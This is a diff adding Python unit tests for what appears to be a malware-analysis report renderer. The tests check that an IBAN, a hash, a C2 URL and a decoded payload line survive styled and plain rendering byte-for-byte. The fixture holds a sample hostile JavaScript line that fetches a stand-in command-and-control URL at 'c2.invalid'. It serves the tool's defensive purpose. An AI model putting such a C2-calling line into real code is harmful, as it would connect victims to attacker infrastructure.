@@ -478,5 +478,53 @@ class OutputModeTests(unittest.TestCase):
         self.assertEqual(visible(rendered), SAMPLE)
 
 
+class ZeroActionIbanReportTests(unittest.TestCase):
+    """A zero-action deterministic report (the IBAN closure shape) renders with
+    structure, and every exact fact -- IBAN, stage sha, C2 URL, decoded body --
+    survives byte-for-byte through both the styled and the plain path."""
+
+    IBAN = "DE89370400440532013000"
+    STAGE_SHA = "5d51e7659955a754c0b2f2c1e0a4d8b3f6e7c9a1b2d3e4f50617283940a1b2c3"
+    C2_URL = "http://c2.invalid/gate.php?id=42"
+    REPORT = (
+        "## Report\n\n"
+        "**No open question** requires an action.\n\n"
+        "## Verified indicators\n\n"
+        f"- iban: {IBAN}\n"
+        f"- uri: {C2_URL}\n\n"
+        "## Deterministic transformations\n\n"
+        "- transform: `js_fromcharcode_offset`\n"
+        f"  stage_sha256: {STAGE_SHA}\n\n"
+        "```javascript\n"
+        f"var iban = \"{IBAN}\"; fetch(\"{C2_URL}\");\n"
+        "```\n"
+    )
+
+    def test_styled_render_shows_structure_and_keeps_every_fact(self) -> None:
+        rendered = render_report(self.REPORT, force_style=True)
+        self.assertIn("\033", rendered)  # it did style something
+        # Structure shown, content unchanged: stripping the escapes is the report.
+        self.assertEqual(visible(rendered), self.REPORT)
+        # Each exact fact survives verbatim even with escapes interleaved.
+        for fact in (self.IBAN, self.STAGE_SHA, self.C2_URL):
+            self.assertIn(fact, visible(rendered))
+            self.assertIn(fact, rendered)
+
+    def test_plain_mode_is_the_report_unchanged(self) -> None:
+        self.assertEqual(render_report(self.REPORT, force_style=False), self.REPORT)
+
+    def test_fenced_payload_is_verbatim(self) -> None:
+        rendered = render_report(self.REPORT, force_style=True)
+        fenced_line = f'var iban = "{self.IBAN}"; fetch("{self.C2_URL}");'
+        self.assertIn(fenced_line, visible(rendered))
+        self.assertIn(fenced_line, rendered)  # not split by inline styling
+
+    def test_rendering_never_mutates_the_report_string(self) -> None:
+        original = self.REPORT
+        render_report(self.REPORT, force_style=True)
+        render_report(self.REPORT, force_style=False)
+        self.assertEqual(self.REPORT, original)
+
+
 if __name__ == "__main__":
     unittest.main()
